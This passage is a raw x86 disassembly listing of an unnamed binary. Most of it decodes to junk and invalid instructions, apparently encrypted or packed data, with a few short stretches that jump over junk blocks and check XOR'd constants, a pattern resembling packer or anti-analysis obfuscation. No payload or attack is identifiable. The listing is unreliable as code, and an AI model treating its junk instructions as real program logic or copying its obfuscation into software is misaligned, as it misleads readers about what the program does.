  401917:	xor    DWORD PTR [esi+0x7e],0xfd591928
  40191e:	ins    BYTE PTR es:[edi],dx
  40191f:	fimul  DWORD PTR [edx+ebp*1+0x33]
  401923:	aaa    
  401924:	out    dx,eax
  401925:	push   ebp
  401926:	fld    TBYTE PTR [edx-0x74]
  401929:	rcr    edi,1
  40192b:	(bad)  
  40192c:	mov    bh,0xd7
  40192e:	jmp    0x40196d
  401930:	mov    eax,0x66afd4ae
  401935:	push   ds
  401936:	lock pop esp
  401938:	or     eax,0x801fae0c
  40193d:	cli    
  40193e:	adc    edi,DWORD PTR [ecx+0x51]
  401941:	shl    esi,0x31
  401944:	add    cl,BYTE PTR [esi-0x2a]
  401947:	daa    
  401948:	ss dec edi
  40194a:	sub    eax,0x72f18e32
  40194f:	aaa    
  401950:	loop   0x4018fe
  401952:	imul   ecx,DWORD PTR [ebx-0x9a4041f],0x116f9ccf
  40195c:	es pop ecx
  40195e:	mov    bl,0x7a
  401960:	stos   DWORD PTR es:[edi],eax
  401961:	cli    
  401962:	mov    edi,0x7efdb810
  401967:	or     eax,0x1024b8ea
  40196c:	test   bl,ah
  40196e:	out    0x80,eax
  401970:	gs (bad) 
  401972:	aad    0x4c
  401974:	jne    0x401947
  401976:	ror    BYTE PTR [eax-0x3f],1
  401979:	gs xchg edx,eax
  40197b:	inc    edx
  40197c:	pop    ebp
  40197d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40197e:	pushw  cs
  401980:	cmp    DWORD PTR [eax-0x46cc24d0],edx
  401986:	pop    ebx
  401987:	add    dh,BYTE PTR [ecx]
  401989:	push   ebx
  40198a:	cmp    ecx,DWORD PTR [ecx]
  40198c:	int3   
  40198d:	or     DWORD PTR [edx-0x19314f59],esi
  401993:	fist   DWORD PTR [edi]
  401995:	rol    BYTE PTR [ecx+eax*8],1
  401998:	add    esp,ebp
  40199a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40199b:	xchg   edx,eax
  40199c:	push   cs
  40199d:	or     esp,DWORD PTR [ecx+0x3f]
  4019a0:	jne    0x4019e7
  4019a2:	pop    eax
  4019a3:	or     cl,bl
  4019a5:	sub    al,0xe2
  4019a7:	cmp    cl,ch
  4019a9:	in     al,0xe3
  4019ab:	mov    ds:0x330fbdb2,eax
  4019b0:	ret    0x7d3d
  4019b3:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  4019ba:	add    BYTE PTR [eax],al
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	dec    ecx
  401a1a:	sub    ebp,DWORD PTR [edx]
  401a1c:	shl    DWORD PTR [ebx+edi*2+0x7d977070],cl
  401a23:	jo     0x401a95
  401a25:	pop    ebp
  401a26:	arpl   WORD PTR [edi],dx
  401a28:	nop
  401a29:	repnz or bl,BYTE PTR [ecx+ecx*1+0xc]
  401a2e:	jl     0x4019df
  401a30:	dec    ebp
  401a31:	mov    esp,0xb0937ce0
  401a36:	xchg   al,al
  401a38:	lea    esp,[eax-0x7f9ea2]
  401a3e:	jle    0x401a43
  401a40:	out    0x2a,eax
  401a42:	add    al,0x77
  401a44:	in     al,dx
  401a45:	mov    ebp,DWORD PTR [edi+0x61]
  401a48:	xor    cl,BYTE PTR [esi-0x3e]
  401a4b:	add    DWORD PTR [ebp+0x15],edx
  401a4e:	inc    esp
  401a4f:	lea    edx,ds:[edx]
  401a52:	mov    ch,0xf0
  401a54:	cmp    dl,0xd3
  401a57:	cmp    al,BYTE PTR [ebp+0x4a]
  401a5a:	test   DWORD PTR [esi],eax
  401a5c:	dec    eax
  401a5d:	adc    al,0x20
  401a5f:	pop    esp
  401a60:	js     0x401a98
  401a62:	push   DWORD PTR cs:[ecx-0x6c]
  401a66:	mov    ch,ah
  401a68:	(bad)  
  401a69:	push   edi
  401a6a:	mov    dl,0x49
  401a6c:	dec    esi
  401a6d:	in     al,0x8f
  401a6f:	or     BYTE PTR [ebx],cl
  401a71:	and    eax,0xe8d963cb
  401a76:	ins    DWORD PTR es:[edi],dx
  401a77:	cmp    BYTE PTR [edi+0x23],ah
  401a7a:	cld    
  401a7b:	fwait
  401a7c:	inc    esp
  401a7d:	mov    esp,0xd1d40be3
  401a82:	(bad)  
  401a83:	mov    ecx,0xc1189337
  401a88:	and    eax,0x48129f27
  401a8d:	pop    ecx
  401a8e:	pop    ebx
  401a8f:	loop   0x401a15
  401a91:	push   0xffffff8f
  401a93:	cmp    edi,DWORD PTR [ebp+0x66a2c996]
  401a99:	cld    
  401a9a:	push   esp
  401a9b:	imul   eax,DWORD PTR [edx+0x47],0xf96499eb
  401aa2:	inc    edi
  401aa3:	lods   eax,DWORD PTR ds:[esi]
  401aa4:	inc    edi
  401aa5:	jnp    0x401a28
  401aa7:	fcom   st(0)
  401aa9:	sbb    esi,DWORD PTR [ecx+0x4b]
  401aac:	mov    dh,0x23
  401aae:	xor    al,0x62
  401ab0:	rcl    DWORD PTR [ebx],0x54
  401ab3:	jmp    0xd64bd9e2
  401ab8:	lds    eax,FWORD PTR [edx]
  401aba:	in     al,0x9c
  401abc:	repnz cli 
  401abe:	xchg   ebp,eax
  401abf:	cwde   
  401ac0:	(bad)  
  401ac1:	mov    ecx,0xe0687b2f
  401ac6:	cli    
  401ac7:	sub    esp,DWORD PTR [ebx+0x2a166ba7]
  401acd:	mov    ds:0x5f6d4399,eax
  401ad2:	jne    0x401ad8
  401ad4:	cli    
  401ad5:	adc    eax,0xffffff9e
  401ad8:	mov    al,BYTE PTR [edi]
  401ada:	dec    esp
  401adb:	mov    bl,0x51
  401add:	lds    ebp,FWORD PTR [ebp+0x30]
  401ae0:	jle    0x401a9f
  401ae2:	xchg   edx,eax
  401ae3:	fcom   st(4)
  401ae5:	fwait
  401ae6:	mov    eax,0xbb0bd0ed
  401aeb:	inc    esi
  401aec:	loope  0x401af6
  401aee:	sbb    DWORD PTR [ecx-0x5d71e55],edx
  401af4:	das    
  401af5:	arpl   si,dx
  401af7:	inc    edi
  401af8:	ins    DWORD PTR es:[edi],dx
  401af9:	inc    eax
  401afa:	test   eax,0x3f067dce
  401aff:	pop    esi
  401b00:	inc    esp
  401b01:	push   ds
  401b02:	jp     0x401b5c
  401b04:	loop   0x401b3d
  401b06:	and    DWORD PTR [ebp-0x47ff690],esi
  401b0c:	xlat   BYTE PTR ds:[ebx]
  401b0d:	ins    DWORD PTR es:[edi],dx
  401b0e:	inc    ebx
  401b0f:	dec    ecx
  401b10:	cmp    esp,DWORD PTR [ecx+0x14699916]
  401b16:	in     eax,0x1c
  401b18:	xor    BYTE PTR ds:0x7dd9829f,0xf8
  401b1f:	les    ebx,FWORD PTR [edi-0x72]
  401b22:	int3   
  401b23:	cmp    edi,ebx
  401b25:	dec    eax
  401b26:	mov    edx,0x3f248cfb
  401b2b:	jp     0x401b0a
  401b2d:	adc    DWORD PTR [edi+0xb],ecx
  401b30:	in     al,dx
  401b31:	xlat   BYTE PTR ds:[ebx]
  401b32:	stos   BYTE PTR es:[edi],al
  401b33:	mov    ds:0x39b03e6e,eax
  401b38:	inc    edx
  401b39:	push   ss
  401b3a:	(bad)  [edx-0x294414b2]
  401b40:	sti    
  401b41:	mov    ah,0xcf
  401b43:	sub    ch,BYTE PTR [eax+eax*2+0x58]
  401b47:	sbb    dl,bl
  401b49:	pop    ebx
  401b4a:	inc    ebp
  401b4b:	int3   
  401b4c:	stos   BYTE PTR es:[edi],al
  401b4d:	iret   
  401b4e:	dec    esp
  401b4f:	arpl   si,bx
  401b51:	addr16 fpatan 
  401b54:	popf   
  401b55:	ja     0x401b29
  401b57:	lods   al,BYTE PTR ds:[esi]
  401b58:	(bad)  
  401b59:	mov    eax,0xb2283c82
  401b5e:	out    0x57,eax
  401b60:	mov    esp,0x6e04bee1
  401b65:	rcl    BYTE PTR [edx],1
  401b67:	std    
  401b68:	outs   dx,BYTE PTR ds:[esi]
  401b69:	mov    ds:0x86dc33db,eax
  401b6e:	jp     0x401bb1
  401b70:	cdq    
  401b71:	(bad)  
  401b72:	fsub   QWORD PTR [edi+0x1b]
  401b75:	popa   
  401b76:	lahf   
  401b77:	add    al,0x3a
  401b79:	ficomp WORD PTR [edx+0x3d]
  401b7c:	dec    esi
  401b7d:	fnsave [ebx+ebx*8-0x3f]
  401b81:	push   cs
  401b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b83:	sbb    al,0xd3
  401b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b86:	scas   al,BYTE PTR es:[edi]
  401b87:	fst    QWORD PTR [eax+0x58]
  401b8a:	jae    0x401b37
  401b8c:	(bad)  
  401b8d:	ins    BYTE PTR es:[edi],dx
  401b8e:	(bad)  
  401b8f:	pushf  
  401b90:	sbb    ebp,ecx
  401b92:	icebp  
  401b93:	adc    DWORD PTR [edx],ecx
  401b95:	mov    al,0xff
  401b97:	pop    ss
  401b98:	push   0x3eda1081
  401b9d:	sbb    al,0x70
  401b9f:	dec    esp
  401ba0:	ror    DWORD PTR [ecx-0x55],0x1b
  401ba4:	or     eax,0x3ec1c5a7
  401ba9:	mov    bl,0xfa
  401bab:	adc    eax,0xe5cf1456
  401bb0:	pop    esp
  401bb1:	ret    0x278d
  401bb4:	(bad)  
  401bb5:	push   ebx
  401bb7:	dec    edx
  401bb8:	push   esp
  401bb9:	(bad)  
  401bba:	arpl   WORD PTR [esi],dx
  401bbc:	je     0x401c36
  401bbe:	adc    eax,edx
  401bc0:	sub    eax,0x1a5c7b5b
  401bc5:	cli    
  401bc6:	fldln2 
  401bc8:	(bad)  
  401bc9:	fdiv   QWORD PTR [ebx+0xa4cdc]
  401bcf:	div    BYTE PTR [esi-0x6f799807]
  401bd5:	mov    ecx,0x2616b2a4
  401bda:	out    dx,al
  401bdb:	cmp    esi,DWORD PTR [eax-0x48746c6c]
  401be1:	xchg   edx,eax
  401be2:	mov    dh,0x7b
  401be4:	adc    al,0x87
  401be6:	adc    BYTE PTR [esi],cl
  401be8:	and    edi,DWORD PTR [eax-0x6d]
  401beb:	pop    ds
  401bec:	jp     0x401c42
  401bee:	nop
  401bef:	scas   eax,DWORD PTR es:[edi]
  401bf0:	push   edx
  401bf1:	lock xchg DWORD PTR [esi+0x62862dcc],eax
  401bf8:	jl     0x401c0d
  401bfa:	xor    BYTE PTR [edi+0x4b],dl
  401bfd:	mov    edi,esp
  401bff:	pop    ss
  401c00:	lock sub eax,0x6946a32e
  401c06:	ja     0x401b9b
  401c08:	mov    gs,esi
  401c0a:	dec    esi
  401c0b:	cmp    DWORD PTR [edi],edi
  401c0d:	inc    edx
  401c0e:	jp     0x401c46
  401c10:	out    dx,eax
  401c11:	push   esi
  401c12:	jo     0x401c61
  401c14:	dec    edi
  401c15:	in     al,dx
  401c16:	mov    esi,0x7e9011c
  401c1b:	inc    bx
  401c1d:	xor    esp,ebp
  401c1f:	pushf  
  401c20:	inc    eax
  401c21:	retf   0xc070
  401c24:	(bad)  
  401c25:	(bad)  
  401c26:	jo     0x401c79
  401c28:	es cld 
  401c2a:	js     0x401bae
  401c2c:	in     al,0xfb
  401c2e:	dec    ebp
  401c2f:	frstor [esi]
  401c31:	retf   0xf536
  401c34:	add    ah,BYTE PTR [ebx+0x3a]
  401c37:	les    ebx,FWORD PTR [esi]
  401c39:	inc    edi
  401c3a:	(bad)  
  401c3b:	in     al,0xbb
  401c3d:	jb     0x401c9f
  401c3f:	sbb    al,0x80
  401c41:	lea    esi,[esi-0x719533b7]
  401c47:	mov    ebx,0x170a8a1d
  401c4c:	(bad)  
  401c4e:	and    cl,ch
  401c50:	inc    ebx
  401c51:	xor    al,cl
  401c53:	add    cl,ah
  401c55:	jmp    0x129600
  401c5a:	or     BYTE PTR [edi+0x1b868788],bl
  401c60:	shr    DWORD PTR [eax-0x530b2baf],cl
  401c66:	pop    ds
  401c67:	(bad)  
  401c68:	iret   
  401c69:	or     DWORD PTR [esi+edx*2],esp
  401c6c:	xchg   ebx,eax
  401c6d:	and    eax,0x77b8b045
  401c72:	js     0x401c33
  401c74:	iret   
  401c75:	stos   BYTE PTR es:[edi],al
  401c76:	test   esi,esi
  401c78:	and    DWORD PTR [edx+0x5],ebp
  401c7b:	xlat   BYTE PTR ds:[ebx]
  401c7c:	out    0x75,eax
  401c7e:	shufps xmm7,xmm1,0xeb
  401c82:	mov    ebp,DWORD PTR [esi+0x5534d5cc]
  401c88:	jmp    0x7c8:0xfd81befe
  401c8f:	and    al,0xf4
  401c91:	mov    BYTE PTR [esi+ecx*1-0x71],bh
  401c95:	mov    dh,BYTE PTR [edi+0x59]
  401c98:	add    eax,0xb9bc0d54
  401c9d:	sbb    al,0xb4
  401c9f:	jo     0x401d02
  401ca1:	push   ebx
  401ca2:	cwde   
  401ca3:	add    BYTE PTR [edi-0x24],0xa9
  401ca7:	dec    esp
  401ca8:	jbe    0x401d1e
  401caa:	push   edx
  401cab:	mov    ss,WORD PTR [ecx-0x6766cb1a]
  401cb1:	dec    eax
  401cb2:	enter  0x56a5,0x97
  401cb6:	and    al,0x9c
  401cb8:	mov    esi,DWORD PTR [ebx+0x68]
  401cbb:	mov    bl,0xa1
  401cbd:	add    ecx,0x48
  401cc0:	(bad)  
  401cc2:	pop    esp
  401cc3:	popa   
  401cc4:	mov    ecx,0xc68bf5ec
  401cc9:	inc    esi
  401cca:	xchg   edx,eax
  401ccb:	xor    DWORD PTR [eax+0x62b6aac9],ecx
  401cd1:	shl    al,cl
  401cd3:	outs   dx,DWORD PTR ds:[esi]
  401cd4:	call   0xdb3df544
  401cd9:	adc    ah,BYTE PTR [edi+0x34]
  401cdc:	cld    
  401cdd:	mov    esp,ebp
  401cdf:	mov    es,WORD PTR [ecx-0x64]
  401ce2:	mov    ebp,0xac3300c0
  401ce7:	sbb    dl,BYTE PTR [ebx-0x33416cf7]
  401ced:	cdq    
  401cee:	(bad)  
  401cef:	push   ebx
  401cf0:	inc    ebp
  401cf1:	iret   
  401cf2:	jl     0x401cc0
  401cf4:	sar    DWORD PTR [ebp+0x6fecd558],cl
  401cfa:	test   DWORD PTR [esi+0x15],edi
  401cfd:	xchg   BYTE PTR [eax+ebx*2-0x4e434907],dl
  401d04:	loope  0x401cd8
  401d06:	sbb    DWORD PTR [eax-0x3c],esi
  401d09:	ss dec edi
  401d0b:	mov    bh,0x3
  401d0d:	(bad)  
  401d0f:	arpl   WORD PTR [ecx-0x2b431be6],bp
  401d15:	pop    esi
  401d16:	pop    ebp
  401d17:	pop    ebp
  401d18:	add    al,0xbb
  401d1a:	cmp    ch,bl
  401d1c:	and    eax,DWORD PTR [eax-0x36]
  401d1f:	mov    ecx,0xeb2c2e56
  401d24:	pop    ecx
  401d25:	(bad)  
  401d26:	not    BYTE PTR [ebx]
  401d28:	sub    DWORD PTR [edx+eiz*1],esp
  401d2b:	push   es
  401d2c:	cli    
  401d2d:	jmp    0x401d50
  401d2f:	mov    ah,0x99
  401d31:	fdivr  QWORD PTR [edx-0x34]
  401d34:	out    0x8a,al
  401d36:	scas   al,BYTE PTR es:[edi]
  401d37:	retf   0xbabb
  401d3a:	sbb    DWORD PTR [esi+0x5387e0be],0xead65496
  401d44:	in     eax,0x5
  401d46:	popa   
  401d47:	stos   BYTE PTR es:[edi],al
  401d48:	add    BYTE PTR [edx+0x61],al
  401d4b:	cli    
  401d4c:	popa   
  401d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d4e:	xchg   esi,eax
  401d4f:	test   BYTE PTR [ebx],0x9b
  401d52:	mov    ah,0x2
  401d54:	in     eax,0x73
  401d56:	pop    ebp
  401d57:	into   
  401d58:	lahf   
  401d59:	adc    BYTE PTR [esi],0xd3
  401d5c:	jb     0x401d98
  401d5e:	rol    dh,cl
  401d60:	push   ds
  401d61:	scas   al,BYTE PTR es:[edi]
  401d62:	or     eax,0xcbcceff6
  401d67:	sub    dl,BYTE PTR [eax+esi*2-0x44]
  401d6b:	(bad)  
  401d6c:	mov    al,ds:0xd159d75
  401d71:	xchg   esi,eax
  401d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d73:	adc    DWORD PTR [edi],eax
  401d75:	mov    cl,cl
  401d77:	std    
  401d78:	div    BYTE PTR [edi-0x41]
  401d7b:	(bad)  
  401d7c:	aam    0x94
  401d7e:	sbb    DWORD PTR ds:0x6e268e10,edi
  401d84:	arpl   WORD PTR [esi-0x79],sp
  401d87:	(bad)  
  401d89:	test   DWORD PTR [edx-0x36d2f5f4],edi
  401d8f:	mov    ah,0x3b
  401d91:	xchg   ecx,eax
  401d92:	sbb    esi,ebx
  401d94:	shl    BYTE PTR [ebx-0x2e],0x85
  401d98:	outs   dx,BYTE PTR ds:[esi]
  401d99:	out    0x37,eax
  401d9b:	ins    DWORD PTR es:[edi],dx
  401d9c:	loopne 0x401d93
  401d9e:	jbe    0x401daf
  401da0:	jge    0x401d86
  401da2:	imul   edx,DWORD PTR [edi],0x6b889bc1
  401da8:	stos   DWORD PTR es:[edi],eax
  401da9:	imul   BYTE PTR [esi-0x2b2c11e6]
  401daf:	rcr    BYTE PTR ds:0xecb4a0f3,1
  401db5:	jecxz  0x401d81
  401db7:	(bad)  
  401db8:	(bad)  
  401db9:	fimul  DWORD PTR [edi]
  401dbb:	dec    edx
  401dbc:	mov    esi,0x315151ef
  401dc1:	sbb    eax,0x434366
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	and    eax,0x3b6ef27a
  401df4:	pop    es
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401dd6
  401dfc:	xchg   ebp,eax
  401dfd:	mov    al,ds:0x22414e21
  401e02:	(bad)  
  401e03:	int3   
  401e04:	outs   dx,DWORD PTR ds:[esi]
  401e05:	jp     0x401dfa
  401e07:	and    al,0x3e
  401e09:	push   ebp
  401e0a:	dec    ecx
  401e0b:	aaa    
  401e0c:	sahf   
  401e0d:	mov    ds:0xd0348928,al
  401e12:	push   es
  401e13:	xor    eax,DWORD PTR [ebp-0x68]
  401e16:	mov    cl,BYTE PTR [ebp+ebx*2+0x52]
  401e1a:	mov    ds:0x8c7f6aff,eax
  401e1f:	loopne 0x401e36
  401e21:	(bad)  
  401e22:	mov    DWORD PTR [ecx],esi
  401e24:	pop    eax
  401e25:	and    dl,bh
  401e27:	pusha  
  401e28:	mov    al,0x9f
  401e2a:	pop    es
  401e2b:	and    edi,ecx
  401e2d:	mov    ah,0x1d
  401e2f:	aam    0xd9
  401e31:	gs aaa 
  401e33:	ret    0xb009
  401e36:	mov    ?,WORD PTR [ebx-0x108c7dbb]
  401e3c:	cmp    bh,al
  401e3e:	or     DWORD PTR [ebp-0x3],0xfffffffb
  401e42:	jb     0x401e9e
  401e44:	lds    edi,FWORD PTR [bp+si]
  401e47:	clc    
  401e48:	mov    bh,0x96
  401e4a:	xlat   BYTE PTR ds:[ebx]
  401e4b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  401e4d:	fsubr  QWORD PTR [eax-0x462a6660]
  401e53:	push   es
  401e54:	lods   eax,DWORD PTR ds:[esi]
  401e55:	sub    BYTE PTR [ecx-0x6d],ah
  401e58:	loopne 0x401e03
  401e5a:	inc    esi
  401e5b:	sbb    cl,BYTE PTR [edx-0x4356cfe0]
  401e61:	cmp    BYTE PTR [ebp+0x3d9abc19],ch
  401e67:	xchg   edi,eax
  401e68:	sbb    ch,BYTE PTR [eax]
  401e6a:	or     esp,DWORD PTR [eax-0x60]
  401e6d:	mov    dh,0x66
  401e6f:	nop
  401e70:	(bad)  
  401e71:	sub    DWORD PTR [ebx-0x30a60a73],esp
  401e77:	loopne 0x401e4a
  401e79:	fistp  QWORD PTR [ecx-0x1c1d7d16]
  401e7f:	sti    
  401e80:	sbb    bh,BYTE PTR [ecx-0x6422b775]
  401e86:	jb     0x401e1e
  401e88:	fnstsw WORD PTR [eax]
  401e8a:	adc    DWORD PTR [ebx+ebx*4],ebx
  401e8d:	inc    ebp
  401e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8f:	jmp    0x97008d4c
  401e94:	arpl   WORD PTR [ecx],bp
  401e96:	in     eax,0xa9
  401e98:	sar    DWORD PTR [eax],cl
  401e9a:	mov    ebx,eax
  401e9c:	and    bh,dh
  401e9e:	xor    al,0x2c
  401ea0:	jle    0x401e2e
  401ea2:	dec    edi
  401ea3:	iret   
  401ea4:	stc    
  401ea5:	push   eax
  401ea6:	xchg   esi,eax
  401ea7:	mov    eax,ds:0xd053cac0
  401eac:	ss pop ebx
  401eae:	add    eax,edx
  401eb0:	rcl    BYTE PTR [ebp+0x3c],cl
  401eb3:	sub    dl,BYTE PTR [ebx-0x7]
  401eb6:	sub    ebp,esp
  401eb8:	cdq    
  401eb9:	imul   edi,DWORD PTR [esi+eiz*8-0x2],0xffffffcf
  401ebe:	xor    al,0x15
  401ec0:	popf   
  401ec1:	mov    eax,ds:0x6f6296d1
  401ec6:	pop    esi
  401ec7:	aas    
  401ec8:	sti    
  401ec9:	inc    ebx
  401eca:	mov    ah,0x21
  401ecc:	ror    ebp,1
  401ece:	push   0xffffff83
  401ed0:	or     BYTE PTR [edi-0x13da6b98],al
  401ed6:	rcr    DWORD PTR [ecx-0x7ddc404c],1
  401edc:	in     eax,0x0
  401ede:	xor    eax,0xd754a8e9
  401ee3:	and    DWORD PTR ss:[edx+0x37b4afa],ebx
  401eea:	dec    edx
  401eeb:	in     al,0x4b
  401eed:	mov    al,0x48
  401eef:	sahf   
  401ef0:	jmp    0xb4e4f0d4
  401ef5:	call   0x4c8f81b7
  401efa:	push   0x7b69db78
  401eff:	jne    0x401e9b
  401f01:	jbe    0x401e85
  401f03:	sub    al,0xa7
  401f05:	push   ebx
  401f06:	jne    0x401ea2
  401f08:	sub    BYTE PTR [eax],0x28
  401f0b:	mov    DWORD PTR [ebx-0x63d277cf],edx
  401f11:	or     ebx,DWORD PTR [esi+0xd]
  401f14:	addr16 jp 0x401ee6
  401f17:	rcl    al,0x40
  401f1a:	mov    ebp,0x7a490634
  401f1f:	mov    ch,0x8d
  401f21:	jb     0x401eb2
  401f23:	mov    al,0xe7
  401f25:	add    edi,DWORD PTR [edi]
  401f27:	jno    0x401ec7
  401f29:	mov    al,ds:0xc4af12f0
  401f2e:	(bad)
  401f31:	fs mov ecx,0x59eac8f7
  401f37:	push   ebp
  401f38:	cmc    
  401f39:	sub    al,0xe1
  401f3b:	inc    ecx
  401f3c:	icebp  
  401f3d:	or     bl,BYTE PTR [ebx+0x3b9856d2]
  401f43:	(bad)  
  401f44:	adc    al,0xf1
  401f46:	sub    ebx,eax
  401f48:	adc    DWORD PTR [ecx],esp
  401f4a:	jno    0x401fad
  401f4c:	and    edi,DWORD PTR [edi]
  401f4e:	xor    cl,BYTE PTR [esi+0x221b0a53]
  401f54:	sbb    cl,bl
  401f56:	dec    edi
  401f57:	mov    esi,0xd08d42d4
  401f5c:	repz (bad) 
  401f5e:	jge    0x401f4c
  401f60:	sbb    al,0xd0
  401f62:	(bad)  
  401f63:	outs   dx,BYTE PTR ds:[esi]
  401f64:	mov    ah,0x7c
  401f66:	dec    esp
  401f67:	push   cs
  401f68:	xor    al,0xdf
  401f6b:	push   eax
  401f6c:	int    0x2e
  401f6e:	dec    esp
  401f6f:	mov    bh,0xf3
  401f71:	or     BYTE PTR [ecx+0x54a23558],dl
  401f77:	shl    DWORD PTR [ebp+0x30],cl
  401f7a:	mov    eax,ds:0x3df5d39
  401f7f:	and    eax,0xae20f74e
  401f84:	cli    
  401f85:	mov    esp,0x5b844d5c
  401f8a:	(bad)  [edi+0x74e78f20]
  401f90:	sar    DWORD PTR [eax+0x69],1
  401f93:	sbb    al,0xd8
  401f95:	and    al,0x79
  401f97:	and    BYTE PTR [ecx-0x70],dl
  401f9a:	and    eax,0x90f7901d
  401f9f:	jo     0x401fa0
  401fa1:	pop    edx
  401fa2:	push   esi
  401fa3:	jbe    0x401ffe
  401fa5:	and    BYTE PTR [edi+0x1ea22e30],dh
  401fab:	rol    BYTE PTR [ecx-0x7055422e],1
  401fb1:	sar    DWORD PTR [edi+0x58],0xcb
  401fb5:	push   eax
  401fb6:	push   edx
  401fb7:	stos   DWORD PTR es:[edi],eax
  401fb8:	push   edi
  401fb9:	dec    ebp
  401fba:	mov    WORD PTR [ebx+eax*4+0x12298a16],?
  401fc1:	stos   BYTE PTR es:[edi],al
  401fc2:	fcmovnb st,st(0)
  401fc4:	pop    ds
  401fc5:	sub    BYTE PTR [esi+ecx*4-0x370e3b12],cl
  401fcc:	and    bh,bl
  401fce:	outs   dx,BYTE PTR ds:[esi]
  401fcf:	out    dx,al
  401fd0:	ins    DWORD PTR es:[edi],dx
  401fd1:	push   0x272f2e0e
  401fd6:	inc    eax
  401fd7:	mov    ecx,0x70e26856
  401fdc:	cs push 0x20
  401fdf:	push   ds
  401fe0:	ja     0x402027
  401fe2:	test   al,0x74
  401fe4:	dec    ebx
  401fe5:	ret    0x19ec
  401fe8:	inc    ebp
  401fe9:	and    dh,BYTE PTR [ecx+0x68]
  401fec:	test   DWORD PTR [ebp+0x3e],eax
  401fef:	sbb    dl,BYTE PTR [esi-0x7a8bb7af]
  401ff5:	xchg   ebx,eax
  401ff6:	jmp    0x99ad:0x4647f40e
  401ffd:	pop    ds
  401ffe:	xor    al,0xf9
  402000:	hlt    
  402001:	int    0x2b
  402003:	retf   0x1a72
  402006:	imul   BYTE PTR [ebp-0x1091a626]
  40200c:	fdivp  st(5),st
  40200e:	and    DWORD PTR [ebp+0x2cac64c6],esi
  402014:	cmp    eax,0x811a4703
  402019:	out    0x33,eax
  40201b:	in     eax,0xc0
  40201d:	fsubr  QWORD PTR [ebp+0x46]
  402020:	sbb    DWORD PTR [ebx-0x69],esp
  402023:	inc    ebx
  402024:	fs mov al,0x93
  402027:	fwait
  402028:	pop    ebx
  402029:	bound  ebx,QWORD PTR [esi-0xc4771b1]
  40202f:	dec    eax
  402030:	fcom   DWORD PTR [ecx+0x4e65f250]
  402036:	mov    DWORD PTR [eax],ebx
  402038:	adc    ebx,DWORD PTR [ecx+0x6f]
  40203b:	jne    0x402087
  40203d:	or     eax,0x63767e6b
  402042:	sbb    eax,0x5143e1ad
  402047:	rcl    dl,1
  402049:	add    al,0x74
  40204b:	add    ebp,DWORD PTR [eax]
  40204d:	xchg   esi,eax
  40204e:	daa    
  40204f:	and    al,bh
  402051:	sbb    ah,ah
  402053:	daa    
  402054:	mov    eax,ds:0x442e0074
  402059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40205a:	pop    es
  40205b:	repz pop edi
  40205d:	ja     0x401fe2
  40205f:	pop    es
  402060:	and    eax,0xb2d533ac
  402065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402066:	adc    eax,0x3e0a313d
  40206b:	mov    ebx,0x6567d894
  402070:	push   es
  402071:	mov    cl,0xab
  402073:	mov    ch,BYTE PTR [edx+0x4e298707]
  402079:	xlat   BYTE PTR ds:[ebx]
  40207a:	in     eax,0x11
  40207c:	jns    0x40200c
  40207e:	sbb    al,0x4a
  402080:	push   cs
  402081:	push   edx
  402082:	popa   
  402083:	dec    ebp
  402084:	add    eax,0x17a0b73a
  402089:	mov    cl,0x95
  40208b:	sbb    DWORD PTR [edx-0x7e3280ea],edx
  402091:	push   edi
  402092:	rcr    DWORD PTR [esi-0x18],cl
  402095:	sti    
  402096:	lods   al,BYTE PTR ds:[esi]
  402097:	enter  0xa37c,0xb0
  40209b:	adc    al,0xc4
  40209d:	pop    ebp
  40209e:	cmc    
  40209f:	or     BYTE PTR [eax-0x7c67aee9],al
  4020a5:	pop    ds
  4020a6:	mov    bl,BYTE PTR [ebx-0x28]
  4020a9:	loop   0x402031
  4020ab:	retf   
  4020ac:	push   0x679b4814
  4020b1:	in     al,dx
  4020b2:	in     eax,dx
  4020b3:	mov    esi,0xec851538
  4020b8:	jg     0x4020bd
  4020ba:	inc    ebp
  4020bb:	outs   dx,DWORD PTR ds:[esi]
  4020bc:	sahf   
  4020bd:	inc    esi
  4020be:	cmc    
  4020bf:	loope  0x4020f3
  4020c1:	icebp  
  4020c2:	or     eax,DWORD PTR [ecx]
